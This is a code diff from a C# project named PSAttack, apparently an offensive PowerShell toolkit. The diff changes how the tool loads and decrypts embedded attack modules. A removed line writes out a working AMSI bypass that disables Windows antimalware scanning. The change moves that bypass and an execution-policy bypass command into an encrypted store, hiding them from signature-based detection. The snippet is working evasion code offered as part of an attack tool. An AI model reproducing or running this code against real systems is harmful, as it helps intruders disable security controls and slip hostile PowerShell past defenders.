@@ -40,7 +40,7 @@ namespace PSAttack
                 if (value != "")
                 {
                     string[] entry = value.Split(',');
-                    attackState.generatedKeys.Add(entry[0], entry[1]);
+                    attackState.decryptedStore.Add(entry[0], entry[1]);
                 }
             }
 
@@ -49,7 +49,7 @@ namespace PSAttack
             {
                 try
                 {
-                    attackState.cmd = "[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiInitFailed\",\"NonPublic,Static\").SetValue($null,$true)";
+                    attackState.cmd = attackState.decryptedStore["amsiBypass"];
                     Processing.PSExec(attackState);
                 }
                 catch
@@ -63,18 +63,20 @@ namespace PSAttack
             string[] resources = assembly.GetManifestResourceNames();
             foreach (string resource in resources)
             {
-                if (resource.Contains(attackState.generatedKeys["encFileExtension"]))
+                if (resource.Contains("PSAttack.Modules."))
                 {
-                    string fileName = resource.Replace("PSAttack.Modules.","").Replace("." + attackState.generatedKeys["encFileExtension"], "");
+                    string fileName = resource.Replace("PSAttack.Modules.", "");
                     string decFilename = CryptoUtils.DecryptString(fileName);
                     Console.ForegroundColor = PSColors.loadingText;
-                    Console.WriteLine("Decrypting: " + decFilename);
+                    Console.WriteLine("Decrypting: {0}", decFilename);
                     Stream moduleStream = assembly.GetManifestResourceStream(resource);
                     PSAUtils.ImportModules(attackState, moduleStream);
                 }
             }
+            Console.ReadLine();
+
             // Setup PS env
-            attackState.cmd = "set-executionpolicy bypass -Scope process -Force";
+            attackState.cmd = attackState.decryptedStore["setExecutionPolicy"];
             Processing.PSExec(attackState);
 
             // check for admin 
